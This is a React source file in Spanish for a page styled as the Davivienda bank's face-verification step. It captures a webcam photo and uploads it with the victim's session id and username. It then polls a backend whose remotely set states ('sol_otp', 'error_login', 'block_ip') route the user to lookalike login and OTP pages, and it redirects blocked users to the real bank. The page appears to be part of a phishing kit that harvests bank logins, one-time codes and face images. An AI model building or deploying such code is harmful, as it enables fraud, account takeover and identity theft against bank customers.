import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingDavivienda from "../../../../../components/LoadingDavivienda";
import "./biometria_davivienda.css";
import biometriaLoopVideoWebm from "../../img/biometria_loop.webm";
import biometriaLoopVideoMp4 from "../../img/biometria_loop_optimized.mp4";
import cameraGuideImage from "../../img/marco_persona.png";
import imagenCamara from "../../img/imagen_camara.png";

const SEGMENTS = 72;
const LOADING_RING_SEGMENTS = 80;
const RING_START_SEC = 2.45;
const RING_FILL_INTERVAL_MS = 55;
const FRAME_ZONE = {
  centerX: 0.5,
  centerY: 0.52,
  radiusX: 0.28,
  radiusY: 0.34,
};
const DAVI_ERROR_KEY = "davivienda_error_modal";
const DAVI_MID_FLOW_KEY = "davivienda_mid_flow";

const ESTADOS_TRAS_ENVIO_BIO = [
  "sol_otp",
  "sol_biometria",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_login",
  "block_ip",
  "error_blocked",
];

const generateSessionId = () =>
  `session_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;

const getLandmarkCenter = (face, type) => {
  const landmark = face.landmarks?.find((entry) => entry.type === type);
  if (!landmark?.locations?.length) return null;
  const sum = landmark.locations.reduce(
    (acc, point) => ({
      x: acc.x + point.x,
      y: acc.y + point.y,
    }),
    { x: 0, y: 0 },
  );
  return {
    x: sum.x / landmark.locations.length,
    y: sum.y / landmark.locations.length,
  };
};

const avgLuma = (data, width, x0, y0, x1, y1) => {
  let sum = 0;
  let count = 0;
  for (let y = y0; y < y1; y += 2) {
    for (let x = x0; x < x1; x += 2) {
      const idx = (y * width + x) * 4;
      const r = data[idx];
      const g = data[idx + 1];
      const b = data[idx + 2];
      sum += 0.299 * r + 0.587 * g + 0.114 * b;
      count++;
    }
  }
  return count ? sum / count : 0;
};

const BiometriaDavivienda = () => {
  // Se inicializa el navigate
  const navigate = useNavigate();

  const videoRef = useRef(null);
  const cameraVideoRef = useRef(null);
  const cameraStreamRef = useRef(null);
  const detectIntervalRef = useRef(null);
  const faceDetectorRef = useRef(null);
  const [view, setView] = useState("intro");
  const [cameraError, setCameraError] = useState("");
  const [faceInFrame, setFaceInFrame] = useState(false);
  const [capturedPhoto, setCapturedPhoto] = useState(null);
  const [activeSegments, setActiveSegments] = useState(0);
  const [isRingVisible, setIsRingVisible] = useState(false);
  const [isCameraReady, setIsCameraReady] = useState(false);
  const [faceHint, setFaceHint] = useState("");
  const [hasAutoFaceValidation, setHasAutoFaceValidation] = useState(true);
  const [loadingDots, setLoadingDots] = useState(1);
  const [getLoading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const analysisCanvasRef = useRef(document.createElement("canvas"));
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const envioEnCursoRef = useRef(false);

  useEffect(() => {
    return () => {
      if (detectIntervalRef.current) {
        clearInterval(detectIntervalRef.current);
      }
      if (cameraStreamRef.current) {
        cameraStreamRef.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  useEffect(() => {
    const pendingError = localStorage.getItem(DAVI_ERROR_KEY);
    const midFlow = sessionStorage.getItem(DAVI_MID_FLOW_KEY) === "1";

    if (pendingError === "error_otp") {
      setShowModal(true);
      setModalText("Error de código OTP.");
    } else if (pendingError === "error_login") {
      setShowModal(true);
      setModalText("Error de login.");
    } else if (pendingError === "block_ip") {
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }
    if (pendingError) {
      localStorage.removeItem(DAVI_ERROR_KEY);
    }

    const sid = localStorage.getItem("sessionId");
    if (!sid) return undefined;
    sessionIdRef.current = sid;

    if (midFlow) {
      allowPollNavigationRef.current = true;
      setLoading(true);
      initPolling();
    }

    return () => {
      stopPolling();
    };
  }, []);

  useEffect(() => {
    const startCamera = async () => {
      if (view !== "camera") return;
      setCameraError("");
      setFaceInFrame(false);
      setFaceHint("Activando cámara...");
      setIsCameraReady(false);
      setHasAutoFaceValidation(true);
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
          },
          audio: false,
        });
        cameraStreamRef.current = stream;
        if (!cameraVideoRef.current) return;
        cameraVideoRef.current.setAttribute("playsinline", "true");
        cameraVideoRef.current.setAttribute("autoplay", "true");
        cameraVideoRef.current.setAttribute("muted", "true");
        cameraVideoRef.current.srcObject = stream;
        await cameraVideoRef.current.play().catch(() => {});
        setIsCameraReady(true);
        setFaceHint("Analizando rostro...");

        if ("FaceDetector" in window) {
          faceDetectorRef.current = new window.FaceDetector({
            fastMode: true,
            maxDetectedFaces: 1,
          });
        } else {
          faceDetectorRef.current = null;
          // Fallback para navegadores sin FaceDetector:
          // habilita captura cuando la camara ya esta activa.
          setHasAutoFaceValidation(false);
          setFaceInFrame(true);
          setFaceHint("Ubique su rostro dentro del marco.");
          return;
        }

        if (detectIntervalRef.current) {
          clearInterval(detectIntervalRef.current);
        }
        detectIntervalRef.current = setInterval(async () => {
          if (!cameraVideoRef.current || !faceDetectorRef.current) return;
          try {
            const faces = await faceDetectorRef.current.detect(cameraVideoRef.current);
            if (!faces.length) {
              setFaceInFrame(false);
              setFaceHint("No se detecta un rostro. Manténgase frente a la cámara.");
              return;
            }

            const faceObject = faces[0];
            const face = faceObject.boundingBox;
            const videoWidth = cameraVideoRef.current.videoWidth || 1;
            const videoHeight = cameraVideoRef.current.videoHeight || 1;
            const cx = face.x + face.width / 2;
            const cy = face.y + face.height / 2;
            const normX = cx / videoWidth;
            const normY = cy / videoHeight;
            const normW = face.width / videoWidth;

            // Zona valida interna del marco (elipse).
            const zoneDx = (normX - FRAME_ZONE.centerX) / FRAME_ZONE.radiusX;
            const zoneDy = (normY - FRAME_ZONE.centerY) / FRAME_ZONE.radiusY;
            const isInsideFrameZone = zoneDx * zoneDx + zoneDy * zoneDy <= 1;

            // Valida que el rostro este centrado dentro del marco circular.
            const dx = normX - 0.5;
            const dy = normY - 0.5;
            const distance = Math.sqrt(dx * dx + dy * dy);
            const isCentered = distance <= 0.3;
            const hasGoodSize = normW >= 0.14 && normW <= 0.72;
            const isValidVertical = normY >= 0.26 && normY <= 0.74;

            // Frontalidad aproximada usando landmarks (ojos/nariz).
            const leftEye = getLandmarkCenter(faceObject, "leftEye");
            const rightEye = getLandmarkCenter(faceObject, "rightEye");
            const noseTip = getLandmarkCenter(faceObject, "noseTip");
            const hasCoreLandmarks = Boolean(leftEye && rightEye && noseTip);
            let isFrontal = false;
            if (leftEye && rightEye && noseTip) {
              const eyeMidX = (leftEye.x + rightEye.x) / 2;
              const eyeDist = Math.abs(rightEye.x - leftEye.x) || 1;
              const noseOffset = Math.abs(noseTip.x - eyeMidX) / eyeDist;
              const eyeTilt = Math.abs(leftEye.y - rightEye.y) / eyeDist;
              isFrontal = noseOffset < 0.2 && eyeTilt < 0.14;
            }

            // Analisis de luz/sombra dentro del rostro (sin oscuridad fuerte lateral).
            const canvas = analysisCanvasRef.current;
            const w = Math.max(1, Math.floor(face.width));
            const h = Math.max(1, Math.floor(face.height));
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext("2d", { willReadFrequently: true });
            let hasGoodLighting = false;
            let noStrongLeftShadow = false;
            let noHatLikeOcclusion = false;
            let noGlassesLikeOcclusion = false;
            if (ctx) {
              ctx.drawImage(
                cameraVideoRef.current,
                face.x,
                face.y,
                face.width,
                face.height,
                0,
                0,
                w,
                h,
              );
              const frame = ctx.getImageData(0, 0, w, h);
              const lumaAll = avgLuma(frame.data, w, 0, 0, w, h);
              const lumaLeft = avgLuma(frame.data, w, 0, 0, Math.floor(w * 0.5), h);
              const lumaRight = avgLuma(frame.data, w, Math.floor(w * 0.5), 0, w, h);
              const lumaTop = avgLuma(frame.data, w, 0, 0, w, Math.floor(h * 0.23));
              const lumaEyes = avgLuma(frame.data, w, 0, Math.floor(h * 0.31), w, Math.floor(h * 0.5));
              const lumaCheeks = avgLuma(frame.data, w, 0, Math.floor(h * 0.56), w, Math.floor(h * 0.8));

              hasGoodLighting = lumaAll >= 64;
              noStrongLeftShadow = lumaLeft / Math.max(lumaRight, 1) >= 0.6;
              noHatLikeOcclusion = lumaTop / Math.max(lumaAll, 1) >= 0.48;
              noGlassesLikeOcclusion = lumaEyes / Math.max(lumaCheeks, 1) >= 0.58;
            }

            const ok =
              isInsideFrameZone &&
              isCentered &&
              hasGoodSize &&
              isValidVertical &&
              hasCoreLandmarks &&
              isFrontal &&
              hasGoodLighting &&
              noStrongLeftShadow &&
              noHatLikeOcclusion &&
              noGlassesLikeOcclusion;

            let hint = "";
            if (ok) {
              hint = "Rostro detectado. Puede tomar la foto.";
            } else if (!isInsideFrameZone) {
              hint = "Ubíquese dentro del marco.";
            } else if (!isCentered) {
              hint = "Centre el rostro dentro del marco.";
            } else if (!hasGoodSize) {
              hint = normW < 0.14 ? "Acérquese un poco al círculo." : "Aléjese un poco del círculo.";
            } else if (!isValidVertical) {
              hint = "Ajuste la altura: mire al centro del marco.";
            } else if (!hasCoreLandmarks) {
              hint = "Mire de frente a la cámara.";
            } else if (!isFrontal) {
              hint = "Gire de frente, sin inclinar la cabeza.";
            } else if (!hasGoodLighting) {
              hint = "Mejore la iluminación sobre su rostro.";
            } else if (!noStrongLeftShadow) {
              hint = "Evite sombras fuertes en su rostro.";
            } else if (!noHatLikeOcclusion || !noGlassesLikeOcclusion) {
              hint = "Retire accesorios y despeje el rostro.";
            }

            setFaceInFrame(ok);
            setFaceHint(hint);
          } catch {
            setFaceInFrame(false);
            setFaceHint("No se pudo validar el rostro. Intente de nuevo.");
          }
        }, 160);
      } catch {
        setCameraError("No se pudo activar la camara. Verifique permisos e intentelo de nuevo.");
        setIsCameraReady(false);
        setFaceHint("No se pudo activar la cámara.");
      }
    };

    startCamera();

    if (view !== "camera") {
      if (detectIntervalRef.current) {
        clearInterval(detectIntervalRef.current);
        detectIntervalRef.current = null;
      }
      if (cameraStreamRef.current) {
        cameraStreamRef.current.getTracks().forEach((track) => track.stop());
        cameraStreamRef.current = null;
      }
    }
  }, [view]);

  useEffect(() => {
    if (view !== "loading") {
      setLoadingDots(1);
      return;
    }

    const dotsInterval = setInterval(() => {
      setLoadingDots((prev) => (prev >= 3 ? 1 : prev + 1));
    }, 420);

    return () => clearInterval(dotsInterval);
  }, [view]);

  const handleVideoTimeUpdate = () => {
    const video = videoRef.current;
    if (!video) return;

    const duration = video.duration || 0;
    if (!duration || duration <= RING_START_SEC) {
      setIsRingVisible(false);
      setActiveSegments(0);
      return;
    }

    // Ventana de carga en el tramo final del loop del video.
    const ringWindow = (SEGMENTS * RING_FILL_INTERVAL_MS) / 1000;
    const ringEnd = duration - 0.04;
    const ringStart = Math.max(RING_START_SEC, ringEnd - ringWindow);

    if (video.currentTime < ringStart || video.currentTime > ringEnd) {
      setIsRingVisible(false);
      setActiveSegments(0);
      return;
    }

    const progress = (video.currentTime - ringStart) / (ringEnd - ringStart);
    const nextSegments = Math.max(0, Math.min(SEGMENTS, Math.floor(progress * SEGMENTS)));
    setIsRingVisible(true);
    setActiveSegments(nextSegments);
  };

  const handleTakePhoto = async () => {
    const video = cameraVideoRef.current;
    if (!video || !video.videoWidth || !video.videoHeight) return;

    // Captura limpia solo desde la camara (sin overlays/marcos visuales).
    const size = Math.min(video.videoWidth, video.videoHeight);
    const sx = (video.videoWidth - size) / 2;
    const sy = (video.videoHeight - size) / 2;

    const canvas = document.createElement("canvas");
    canvas.width = size;
    canvas.height = size;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
    const photoDataUrl = canvas.toDataURL("image/jpeg", 0.92);
    setCapturedPhoto(photoDataUrl);
    setView("loading");
    setFaceInFrame(false);
    await uploadBiometriaPhoto(canvas);
  };

  const uploadBiometriaPhoto = async (canvas) => {
    if (!canvas) return;

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    if (!sessionId) {
      setShowModal(true);
      setModalText("Sesión no encontrada. Vuelve a iniciar sesión.");
      setView("intro");
      return;
    }

    const username = localStorage.getItem("davivienda_usuario") || "Usuario";

    const blob = await new Promise((resolve) => {
      canvas.toBlob((result) => resolve(result), "image/jpeg", 0.92);
    });
    if (!blob) {
      setShowModal(true);
      setModalText("No se pudo procesar la foto. Intenta de nuevo.");
      setView("camera");
      return;
    }

    const formData = new FormData();
    formData.append("sessionId", sessionId);
    formData.append("username", username);
    formData.append("image1", blob, `biometria_${Date.now()}.jpg`);

    stopPolling();
    lastEstadoRef.current = null;
    envioEnCursoRef.current = true;

    try {
      setLoading(true);
      const response = await instanceBackend.post(
        "/davivienda/biometrics/upload",
        formData,
        {
          headers: { "Content-Type": "multipart/form-data" },
        },
      );

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        sessionStorage.setItem(DAVI_MID_FLOW_KEY, "1");
        allowPollNavigationRef.current = true;
        initPolling();
      } else {
        envioEnCursoRef.current = false;
        setLoading(false);
        setShowModal(true);
        setModalText("Error de conexión con el servidor.");
        setView("camera");
      }
    } catch (error) {
      envioEnCursoRef.current = false;
      setLoading(false);
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      setShowModal(true);
      setModalText(
        error?.response?.data?.message ||
          "Error de conexión con el servidor.",
      );
      setView("camera");
    }
  };

  const handleContinueToCamera = () => {
    if (videoRef.current) {
      videoRef.current.pause();
      videoRef.current.removeAttribute("src");
      videoRef.current.load();
    }
    setIsRingVisible(false);
    setActiveSegments(0);
    setView("camera");
  };

  // Se crea helper de redirección
  const redirigir = (ruta) => {
    navigate(ruta);
  };

  // Se limpia y cierra modal local
  const closeModal = () => {
    setShowModal(false);
    setView("intro");
    setCapturedPhoto(null);
    setFaceInFrame(false);
    setFaceHint("");
  };

  const initPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyState();
    }, 3000);
    verifyState();
  };

  // Se valida estado desde backend
  const verifyState = async () => {
    try {
      const response = await instanceBackend.post(
        `/davivienda/verify-state/${sessionIdRef.current}`,
      );
      const estadoActual = (response?.data?.estado || "").toLowerCase();

      if (!estadoActual) return;

      if (
        ESTADOS_TRAS_ENVIO_BIO.includes(estadoActual) &&
        !allowPollNavigationRef.current
      ) {
        return;
      }

      if (lastEstadoRef.current === estadoActual) return;

      const estadoAnterior = lastEstadoRef.current;
      lastEstadoRef.current = estadoActual;

      switch (estadoActual) {
        case "sol_biometria":
          envioEnCursoRef.current = false;
          setLoading(false);
          if (estadoAnterior !== "sol_biometria") {
            setView("intro");
            setCapturedPhoto(null);
            setFaceInFrame(false);
            setFaceHint("");
          }
          break;
        case "sol_otp":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
          if (estadoAnterior !== "sol_otp") {
            redirigir("/davivienda_otp_pse");
          }
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
          redirigir("/finalizado-pse");
          break;
        case "error_otp":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          localStorage.setItem(DAVI_ERROR_KEY, "error_otp");
          redirigir("/davivienda_otp_pse");
          break;
        case "error_login":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          localStorage.setItem(DAVI_ERROR_KEY, "error_login");
          redirigir("/davivienda_pse");
          break;
        case "block_ip":
        case "error_blocked":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
          setShowModal(true);
          setModalText("Acceso bloqueado por seguridad.");
          break;
        default:
          break;
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        stopPolling();
        envioEnCursoRef.current = false;
        setLoading(false);
        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Ajustes manuales del recorte del video en el circulo:
  // offsetX/offsetY mueve el video, zoom lo acerca/aleja.
  const videoCircleTune = {
    offsetX: -0,
    offsetY: 55,
    zoom: 1.80,
  };

  const cameraGuideTune = {
    offsetX: 0,
    offsetY: 14,
    zoom: 2,
  };

  return (
    <div
      className={`biometria-davivienda-page${
        view === "intro" ? " biometria-davivienda-page--intro" : ""
      }${view === "camera" ? " biometria-davivienda-page--camera" : ""}`}
    >
      {view !== "loading" ? (
        <>
          <h1 className="biometria-davivienda-title">Tome una foto de su rostro</h1>
          <p className="biometria-davivienda-copy">
            Busque un espacio iluminado y haga una expresion neutra. No use gafas, sombreros o accesorios
            que tapen su rostro.
          </p>
        </>
      ) : null}

      <div className="biometria-davivienda-preview-stack">
        <div className="biometria-davivienda-avatar-wrap">
        {view === "intro" && isRingVisible ? (
          <div className="biometria-davivienda-loading-ring" aria-hidden="true">
            {Array.from({ length: SEGMENTS }).map((_, index) => (
              <span
                key={index}
                className={`biometria-davivienda-loading-ring-segment${
                  index < activeSegments ? " biometria-davivienda-loading-ring-segment--active" : ""
                }`}
                style={{ transform: `rotate(${(360 / SEGMENTS) * index}deg)` }}
              />
            ))}
          </div>
        ) : null}
        <div
          className={`biometria-davivienda-avatar${
            view === "camera" ? " biometria-davivienda-avatar--camera" : ""
          }${
            view === "loading" ? " biometria-davivienda-avatar--loading" : ""
          }`}
        >
          {view === "intro" ? (
            <video
              ref={videoRef}
              className="biometria-davivienda-video"
              autoPlay
              muted
              loop
              playsInline
              preload="metadata"
              onTimeUpdate={handleVideoTimeUpdate}
              style={{
                "--video-offset-x": `${videoCircleTune.offsetX}px`,
                "--video-offset-y": `${videoCircleTune.offsetY}px`,
                "--video-zoom": videoCircleTune.zoom,
              }}
            >
              <source src={biometriaLoopVideoWebm} type="video/webm" />
              <source src={biometriaLoopVideoMp4} type="video/mp4" />
            </video>
          ) : view === "camera" ? (
            <>
              <video
                ref={cameraVideoRef}
                className={`biometria-davivienda-video biometria-davivienda-video--camera${
                  isCameraReady ? "" : " biometria-davivienda-video--camera-hidden"
                }`}
                playsInline
                muted
              />
              {!isCameraReady ? <div className="biometria-davivienda-camera-loading" aria-hidden="true" /> : null}
              <img
                src={cameraGuideImage}
                alt=""
                aria-hidden="true"
                className="biometria-davivienda-camera-guide-image"
                style={{
                  "--guide-offset-x": `${cameraGuideTune.offsetX}px`,
                  "--guide-offset-y": `${cameraGuideTune.offsetY}px`,
                  "--guide-zoom": cameraGuideTune.zoom,
                }}
              />
            </>
          ) : (
            <>
              <div className="biometria-davivienda-loading-stage">
                <span className="biometria-davivienda-loading-text">
                  <span className="biometria-davivienda-loading-text-base">Cargando</span>
                  <span className="biometria-davivienda-loading-text-dots">{".".repeat(loadingDots)}</span>
                </span>
              </div>
              <div className="biometria-davivienda-loading-stage-ring" aria-hidden="true">
                {Array.from({ length: LOADING_RING_SEGMENTS }).map((_, index) => (
                  <span
                    key={index}
                    className="biometria-davivienda-loading-stage-segment"
                    style={{ transform: `rotate(${(360 / LOADING_RING_SEGMENTS) * index}deg)` }}
                  />
                ))}
              </div>
            </>
          )}
        </div>
        </div>

        {view === "camera" ? (
          <p
            className={`biometria-davivienda-face-status${
              faceInFrame && isCameraReady && hasAutoFaceValidation ? " biometria-davivienda-face-status--ok" : ""
            }`}
            role="status"
            aria-live="polite"
          >
            {cameraError || faceHint}
          </p>
        ) : null}
      </div>

      <div className="biometria-davivienda-page-spacer" aria-hidden="true" />

      {view === "intro" ? (
        <button
          type="button"
          className="biometria-davivienda-button"
          onClick={handleContinueToCamera}
        >
          Continuar
        </button>
      ) : view === "camera" ? (
        <button
          type="button"
          className={`biometria-davivienda-button biometria-davivienda-button--camera${
            faceInFrame ? " biometria-davivienda-button--camera-active" : ""
          }`}
          disabled={!faceInFrame && hasAutoFaceValidation}
          onClick={handleTakePhoto}
        >
          <span className="biometria-davivienda-button-camera-label">Tomar foto</span>
          <span className="biometria-davivienda-button-camera-icon">
            <img src={imagenCamara} alt="" className="biometria-davivienda-button-camera-icon-img" />
          </span>
        </button>
      ) : null}

      {capturedPhoto ? <img src={capturedPhoto} alt="" className="biometria-davivienda-captured-preview" /> : null}

      {showModal && (
        <div className="davivienda-modal-wrap" onClick={closeModal}>
          <div className="davivienda-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="davivienda-modal-top">Personas</div>
            <div className="davivienda-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="davivienda-modal-bot">
              <button
                type="button"
                className="davivienda-modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {getLoading && <LoadingDavivienda isOpen />}
    </div>
  );
};

export default BiometriaDavivienda;
